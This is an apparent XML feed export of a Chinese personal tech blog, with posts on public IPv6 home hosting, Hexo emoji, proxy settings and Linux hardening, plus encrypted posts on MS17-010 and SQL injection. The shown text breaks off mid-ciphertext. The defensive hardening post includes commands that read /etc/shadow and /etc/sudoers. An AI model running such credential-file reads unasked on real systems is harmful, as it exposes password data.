<p><img src="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230228233437568.png" class="lazy" data-srcset="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230228233437568.png" srcset="/images/loadingImage.gif" alt="image-20230228233437568"></p>
<p>地址和前缀的获取方式这里可能需要自己尝试下，管不管用取决于运营商开启的分配策略。NPTv6就是ipv6版的NAT协议，如果配置好获取地址和前缀的方式后，电脑直接连接光猫能够获取公网ipv6地址，那么就不需要打开了。</p>
<p>完成宽带设置后，还需要确认下LAN侧地址配置，如下图所示：</p>
<p><img src="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230228235426926.png" class="lazy" data-srcset="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230228235426926.png" srcset="/images/loadingImage.gif" alt="image-20230228235426926"></p>
<p>保存应用后，将电脑通过网线或者WIFI直接连上光猫，确认是否获取到公网ipv6地址。移动的ipv6是2409开头，电信和联通则是240e和2408，如果没有就需要尝试其他的获取地址方式了。</p>
<p><img src="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230301001400712.png" class="lazy" data-srcset="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230301001400712.png" srcset="/images/loadingImage.gif" alt="image-20230301001400712"></p>
<p>电脑直连能够获取公网ipv6地址之后，就可以开个服务看看外网能否访问了。我这里直接用python自带的http模块去监听本机8888端口</p>
<pre><code class="hljs bash">python -m http.server 8888</code></pre>
<p>再使用在线测试工具 <a href="https://ipw.cn/ipv6webcheck/">https://ipw.cn/ipv6webcheck/</a> 判断能否访问（测试时暂时关闭本机和光猫的防火墙）</p>
<p><img src="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230301003503371.png" class="lazy" data-srcset="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230301003503371.png" srcset="/images/loadingImage.gif" alt="image-20230301003503371"></p>
<p>访问失败，但不知道是哪里出了问题，于是摸索了很久，最后试着打开了光猫的ipv6虚拟服务器功能，填入想要开放公网访问的端口，发现连接成功，估计是光猫的默认策略里禁用了传入的连接，需要在这里单独配置后才能被互联网访问。</p>
<p><img src="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230301003924298.png" class="lazy" data-srcset="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230301003924298.png" srcset="/images/loadingImage.gif" alt="image-20230301003924298"></p>
<p><img src="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230301004108524.png" class="lazy" data-srcset="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230301004108524.png" srcset="/images/loadingImage.gif" alt="image-20230301004108524"></p>
<p>这时候我们就可以继续设置路由器了，这里就比较简单了。进入路由器的管理页面，不同品牌和型号的路由器配置方法不同，具体方法可以到生产厂商官网查找对应的配置说明。我这里用的是华硕的RT-AC68U，在高级设置-IPv6中配置ipv6地址获取方式，根据官网的文档，选择穿透模式（Passthrough）即可。</p>
<p><img src="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230301100022508.png" class="lazy" data-srcset="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230301100022508.png" srcset="/images/loadingImage.gif" alt="image-20230301100022508"></p>
<p>这个模式会把路由器的WAN口、LAN口和WiFi桥接起来，一级路由（即光猫）下发的ipv6地址通过网桥直接分配给二级路由下的终端，可以理解为在ipv6网络中，我的路由器是以交换机模式工作的。</p>
<p>配置完后，同样暂时关闭路由器的ipv6防火墙，电脑连接路由器的WiFi，看是否能够像直连光猫一样获取公网ipv6，获取到了基本就没问题了。</p>
<h2 id="防火墙配置"><a class="header-anchor" href="#防火墙配置"></a>防火墙配置</h2>
<p>毕竟是直接暴露在公网上，访问控制还是得做的。主要是光猫、路由器、电脑本机上的防火墙策略需要开启。</p>
<p>光猫的配置页面里面，在安全-防火墙中配置防火墙策略，但这里只能选择低中高等级，并不知道具体控制策略，主要起一个心理作用。</p>
<p>路由器的配置，在高级设置-防火墙里面可以配置，开启ipv6防火墙后默认拒绝所有传入连接，可指定ip和端口开放，但考虑到主机ip是从光猫动态获取的，可能会变化，所以这里就没有启用。</p>
<p>终端防火墙的配置，Windows可以直接在高级防火墙设置里添加允许的传入连接，未匹配到允许规则时windows防火墙默认会拒绝连接。</p>
<h2 id="域名配置"><a class="header-anchor" href="#域名配置"></a>域名配置</h2>
<p>能通过IP访问后，为了让访问过程更方便，我决定申请个域名，通过域名来访问主机，再通过定时执行检查脚本来实现ddns的功能。</p>
<p>查了一些资料后，我在<a href="https://www.namesilo.com/">namesilo</a>花 1.88 美元租了个一年的域名，选他主要是因为便宜、免备案还免费提供whois信息隐藏服务，再把域名解析服务器设置为阿里云，这样管理起来方便一点。</p>
<p><img src="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230301125904797.png" class="lazy" data-srcset="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230301125904797.png" srcset="/images/loadingImage.gif" alt="image-20230301125904797"></p>
<p>这里配置完后，到阿里云的控制台，找到<a href="https://dns.console.aliyun.com/">云解析DNS</a>，页面上简单配置即可，这样下来我们就可以愉快地通过域名访问家里的主机了。</p>
<p>最后是定时检查ip是否改变，这里我参照阿里云的openApi简单写个python脚本，发现ip变化就通过阿里云的Api去修改解析记录，再通过计划任务运行即可。</p>
<h2 id="注意事项"><a class="header-anchor" href="#注意事项"></a>注意事项</h2>
<p>尽管我们通过防火墙对传入连接做了限制，但尽量还是只开放一些静态内容，比如个人博客。如果一定要开放一些FTP、SSH之类的服务，记得选择没有公开漏洞的组件版本，并使用强口令认证。</p>
<h2 id="TODO"><a class="header-anchor" href="#TODO"></a>TODO</h2>
<ol>
<li>
<p>使用虚拟机对外开放服务</p>
</li>
<li>
<p>证书配置</p>
</li>
</ol>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>在Markdown中使用emoji表情</title>
    <url>/2020/04/07/%E6%9D%82%E8%AE%B0/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/</url>
    <content><![CDATA[<h2 id="常用emoji"><a class="header-anchor" href="#常用emoji"></a>常用emoji</h2>
<p><img src="/2020/04/07/%E6%9D%82%E8%AE%B0/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/u8SbATtdLwU5VjB.png" class="lazy" data-srcset="/2020/04/07/%E6%9D%82%E8%AE%B0/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/u8SbATtdLwU5VjB.png" srcset="/images/loadingImage.gif" alt></p>
<p>理想情况下，在Markdown编辑器中输入如上图所示的语句后将显示对应的emoji表情。但实际上是否显示则取决于你的markdown解析器。</p>
<h2 id="hexo博客使用emoji"><a class="header-anchor" href="#hexo博客使用emoji"></a>hexo博客使用emoji</h2>
<p><strong>hexo</strong> 框架默认的markdown解析器是<code>hexo-renderer-marked</code>，并不支持emoji表情的解析。所以如果想要在博客文章里添加emoji表情😮，可以考虑使用<code>hexo-renderer-markdown-it</code> 解析器。</p>
<p>首先打开Node.js的命令行并移动到你的博客根目录下</p>
<p><img src="/2020/04/07/%E6%9D%82%E8%AE%B0/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/jQKAbRWvhGMDFgx.png" class="lazy" data-srcset="/2020/04/07/%E6%9D%82%E8%AE%B0/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/jQKAbRWvhGMDFgx.png" srcset="/images/loadingImage.gif" alt></p>
<p>卸载原有的<code>hexo-renderer-marked</code>：</p>
<pre><code class="hljs plain">npm un hexo-renderer-marked -S</code></pre>
<p>再安装<code>hexo-renderer-markdown-it</code> ：</p>
<pre><code class="hljs plain">npm i hexo-renderer-markdown-it -S</code></pre>
<p>完成之后安装所需的插件：</p>
<pre><code class="hljs plain">npm i markdown-it-emoji -S</code></pre>
<p>最后打开根目录下的<code>_config.yml</code>文件，添加以下配置：</p>
<pre><code class="hljs plain">markdown:
  render:
    html: true ## 在 markdown 文本中支持 html tag 标签
    xhtmlOut: false ## 需要 xtml 文档，使用 &lt;br &#x2F;&gt; 替代 &lt;br&gt;
    breaks: true ## 用 &lt;br&gt; 开始新的一行
    linkify: true ## 自动将 可能是链接的内容转换成链接
    typographer: true ## 印刷标识转换
  plugins:
    - markdown-it-emoji ## emoji表情插件
    - markdown-it-abbr ## 可选
    - markdown-it-footnote ## 可选
    - markdown-it-ins ## 可选，
    - markdown-it-sub ## 可选，下标，如H2O
    - markdown-it-sup ## 可选，上标，如2^10
  anchors:
    level: 2
    collisionSuffix: &#39;&#39;
    permalink: false,
    permalinkClass: &#39;header-anchor&#39;
    permalinkSymbol: &#39;&#39;
    case: 0
    separator: &#39;&#39;</code></pre>
<p>然后保存退出，再重新加载一下hexo即可。</p>
<pre><code class="hljs plain">hexo clean
hexo generate
hexo server</code></pre>
<p>参考来源： <a href="https://zucchiniy.cn/archives/953e2b.html">ZucchinY的博客</a></p>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>已安装程序（服务）的运行方式</title>
    <url>/2022/11/03/%E6%9D%82%E8%AE%B0/%E5%B7%B2%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F%EF%BC%88%E6%9C%8D%E5%8A%A1%EF%BC%89%E7%9A%84%E8%BF%90%E8%A1%8C%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>备忘录</tag>
      </tags>
  </entry>
  <entry>
    <title>网络代理设置</title>
    <url>/2021/07/08/%E6%9D%82%E8%AE%B0/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="命令行代理设置"><a class="header-anchor" href="#命令行代理设置"></a>命令行代理设置</h2>
<p>设置命令行代理（设置环境变量,命令行关闭后则失效）</p>
<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># cmd</span></span>
set HTTP_PROXY=http://127.0.0.1:10809
set HTTPS_PROXY=http://127.0.0.1:10809

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># powershell 默认使用系统代理，无需手动配置</span></span>

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># bash</span></span>
export http_proxy="http://127.0.0.1:10809"
export https_proxy="http://127.0.0.1:10809"

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 测试是否设置成功不要ping google，因为ping命令用的是ICMP协议。正确做法是</span></span>
curl www.google.com</code></pre>
<h2 id="git代理设置"><a class="header-anchor" href="#git代理设置"></a>git代理设置</h2>
<p>设置永久有效</p>
<pre><code class="hljs shell">git config --global http.proxy http://127.0.0.1:10809	
git config --global https.proxy https://127.0.0.1:10809

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 若为socks代理，则为：</span></span>
git config --global http.proxy 'socks5://127.0.0.1:10808'
git config --global https.proxy 'socks5://127.0.0.1:10808'

<span class="hljs-meta">#</span><span class="bash">查看代理是否设置成功</span>
git config --global --list</code></pre>
<h2 id="go代理设置"><a class="header-anchor" href="#go代理设置"></a>go代理设置</h2>
<blockquote>
<p>参考：<a href="https://blog.csdn.net/xiaobai_ol/article/details/106426199">https://blog.csdn.net/xiaobai_ol/article/details/106426199</a></p>
</blockquote>
<p>方法1.配置命令行环境变量（临时）</p>
<p><strong>Bash (Linux or macOS)</strong></p>
<pre><code class="hljs shell">export GOPROXY=https://goproxy.io,direct</code></pre>
<p><strong>PowerShell (Windows)</strong></p>
<pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash">env:GOPROXY = <span class="hljs-string">"https://goproxy.io,direct"</span></span></code></pre>
<p>方法2.配置用户环境变量</p>
<p><strong>Mac/Linux</strong></p>
<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 设置你的 bash 环境变量</span></span>
echo "export GOPROXY=https://goproxy.io,direct" &gt;&gt; ~/.profile &amp;&amp; source ~/.profile

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 如果你的终端是 zsh，使用以下命令</span></span>
echo "export GOPROXY=https://goproxy.io,direct" &gt;&gt; ~/.zshrc &amp;&amp; source ~/.zshrc</code></pre>
<p><strong>Windows</strong></p>
<pre><code class="hljs text">1. 右键 我的电脑 -&gt; 属性 -&gt; 高级系统设置 -&gt; 环境变量
2. 在 “[你的用户名]的用户变量” 中点击 ”新建“ 按钮
3. 在 “变量名” 输入框并新增 “GOPROXY”
4. 在对应的 “变量值” 输入框中新增 “https:&#x2F;&#x2F;goproxy.io,direct”
5. 最后点击 “确定” 按钮保存设置</code></pre>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>备忘录</tag>
        <tag>网络代理</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统加固</title>
    <url>/2021/03/07/%E8%93%9D%E9%98%9F%E6%8A%80%E6%9C%AF/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/</url>
    <content><![CDATA[<h2 id="账号安全"><a class="header-anchor" href="#账号安全"></a>账号安全</h2>
<p><strong>账号相关文件</strong></p>
<pre><code class="hljs bash">/etc/passwd    -- 记录了系统中各用户的一些基本属性，root可写，所有用户可读
/etc/shadow    -- 记录了所有用户的密码
/etc/group     -- 记录了用户组属性

1、检查是否存在除root之外UID为0的用户：
awk -F <span class="hljs-string">':'</span> <span class="hljs-string">'($3==0)&#123;print $1&#125;'</span> /etc/passwd

2、查询可以远程登录的帐号信息
awk <span class="hljs-string">'/\$1|\$6/&#123;print $1&#125;'</span> /etc/shadow

3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限
more /etc/sudoers | grep -v <span class="hljs-string">"^#\|^$"</span> | grep <span class="hljs-string">"ALL=(ALL)"</span>

4、禁用或删除多余及可疑的帐号
usermod -L user    <span class="hljs-comment">#禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头</span>
userdel -r user    <span class="hljs-comment">#将删除user用户，并且将/home目录下的user目录一并删除</span></code></pre>
<p><strong>修改密码策略</strong></p>
<p>vim /etc/login.defs</p>
<pre><code class="hljs plain">PASS_MAX_DAYS      90               密码最长有效期
PASS_MIN_DAYS      10               密码修改之间最小的天数
PASS_MIN_LEN       8                密码长度
PASS_WARN_AGE      7                口令失效前多少天开始通知用户修改密码</code></pre>
<p><strong>设置密码强度</strong></p>
<p>vim  /etc/pam.d/common-password</p>
<p>将原本的</p>
<pre><code class="hljs plain">password requisite  pam_cracklib.so</code></pre>
<p>修改为至少包含一个数字、一个小写字母、一个大写字母、一个特殊字符、且密码长度&gt;=8:</p>
<pre><code class="hljs plain">password requisite  pam_cracklib.so try_first_pass retry&#x3D;3 dcredit&#x3D;-1 lcredit&#x3D;-1 ucredit&#x3D;-1 ocredit&#x3D;-1 minlen&#x3D;8</code></pre>
<p><strong>限制用户登陆</strong></p>
<p>vim  /etc/hosts.deny，若禁止192.168.0.1对服务器进行ssh的登陆，添加如下内容</p>
<pre><code class="hljs plain">sshd : 192.168.0.1</code></pre>
<p><strong>限制登陆次数</strong></p>
<p>应对暴力破解，我们可以限制登陆次数为5，超过5次登陆失败就锁定**。**vim /etc/pam.d/sshd，在 #%PAM-1.0 的下面，加入下面的内容，表示当密码输入错误达到3次，就锁定用户150秒，如果root用户输入密码错误达到3次，锁定300秒。</p>
<pre><code class="hljs plain">auth required pam_tally2.so deny&#x3D;3 unlock_time&#x3D;150 even_deny_root root_unlock_time300</code></pre>
<p>锁定用户的管理：</p>
<pre><code class="hljs plain">pam_tally2                             查看被锁定的用户

pam_tally2  --reset  -u  username      将被锁定的用户解锁</code></pre>
<h2 id="目录-文件权限"><a class="header-anchor" href="#目录-文件权限"></a>目录&amp;文件权限</h2>
<p><strong>存储用户信息的文件</strong></p>
<p>在用户登陆中非常重要的三个文件</p>
<p>/etc/passwd 必须所有用户都可读，root用户可写 –rw-r—r— 权限值为644</p>
<p>/etc/shadow 只有root可读 –r-------- 权限值为400</p>
<p>/etc/group 必须所有用户都可读，root用户可写 –rw-r—r— 权限值为644</p>
<pre><code class="hljs plain">chmod 644 &#x2F;etc&#x2F;passwd
chmod 400 &#x2F;etc&#x2F;shadow
chmod 644 &#x2F;etc&#x2F;group</code></pre>
<p><strong>文件缺省权限设置</strong></p>
<pre><code class="hljs bash">cp /etc/profile /etc/profile.bak
vim   /etc/profile
<span class="hljs-comment">#添加以下内容</span>
<span class="hljs-built_in">umask</span> 022	<span class="hljs-comment">#umask与文件创建后的默认所有权限异或结果即为初始权限</span>
			<span class="hljs-comment">#root创建的文件默认所有权限为666，666~022=644 (root可读可写，其他用户只可读)</span>

<span class="hljs-comment">#执行/etc/profile中的shell命令，直接执行umask命令设置的话重启失效</span>
<span class="hljs-built_in">source</span>  /etc/profile</code></pre>
<h2 id="应用安全设置"><a class="header-anchor" href="#应用安全设置"></a>应用安全设置</h2>
<p><strong>FTP</strong></p>
<p>禁止匿名FTP</p>
<p>vim  /etc/vsftpd/vsftpd.conf</p>
<pre><code class="hljs plain">anonymous_enable&#x3D;NO    #如果存在anonymous_enable则修改,如果不存在则手动增加</code></pre>
<p><strong>SSH</strong></p>
<ol>
<li>在sshd_config禁止root访问和使用sshv2来让ssh更加安全</li>
</ol>
<p>vim /etc/ssh/sshd_config</p>
<pre><code class="hljs plain">PermitRootLogin    no</code></pre>
<ol start="2">
<li>设置SSH空闲超时退出时间,可降低未授权用户访问其他用户ssh会话的风险</li>
</ol>
<p>编辑/etc/ssh/sshd_config，将ClientAliveInterval 设置为300到900，即5-15分钟，将ClientAliveCountMax设置为0-3之间。</p>
<pre><code class="hljs plain">ClientAliveInterval 600
ClientAliveCountMax 2</code></pre>
<ol start="3">
<li>设置较低的Max AuthTrimes参数将降低SSH服务器被暴力攻击成功的风险</li>
</ol>
<p>在/etc/ssh/sshd_config中取消MaxAuthTries注释符号#，设置最大密码尝试失败次数3-6，建议为4：</p>
<pre><code class="hljs plain">MaxAuthTries 4</code></pre>
<p><strong>TELNET</strong></p>
<p>Telnet使用明文传输数据，存在安全隐患，应该避免使用</p>
<p>执行如下语句，查看telnet服务是否在运行</p>
<pre><code class="hljs bash">netstat -na | grep <span class="hljs-string">":23"</span></code></pre>
<p>若正在运行则关闭Telnet服务，在/etc/xinetd.d/telnet中进行配置</p>
<pre><code class="hljs plain">disable&#x3D;yes</code></pre>
<h2 id="网络设置"><a class="header-anchor" href="#网络设置"></a>网络设置</h2>
<p><strong>IPTABLES</strong></p>
<p>根据需求合理配置防火墙</p>
<p>比如将<code>INPUT</code>链默认规则设为<code>DROP</code>，再添加规则将需要开放的端口设置为<code>ACCEPT</code></p>
<pre><code class="hljs bash"><span class="hljs-comment">#将INPUT链默认规则设置为DROP</span>
iptables -P INPUT DROP

<span class="hljs-comment">#按需添加规则使得开放端口能够接收数据包</span>
<span class="hljs-comment">#开放SSH</span>
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
<span class="hljs-comment">#开放80端口</span>
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
<span class="hljs-comment">#...</span></code></pre>
<p><strong>TCP SYN保护机制</strong></p>
<pre><code class="hljs bash"><span class="hljs-built_in">echo</span>“1”&gt;/proc/sys/net/ipv4/tcp_syncookies //默认为1，一般不用设置</code></pre>
<p>表示开启SYN Cookies。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击</p>
]]></content>
      <categories>
        <category>蓝队技术</category>
      </categories>
      <tags>
        <tag>系统配置</tag>
      </tags>
  </entry>
  <entry>
    <title>MS17-010漏洞复现</title>
    <url>/2020/07/18/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入笔记</title>
    <url>/2020/08/10/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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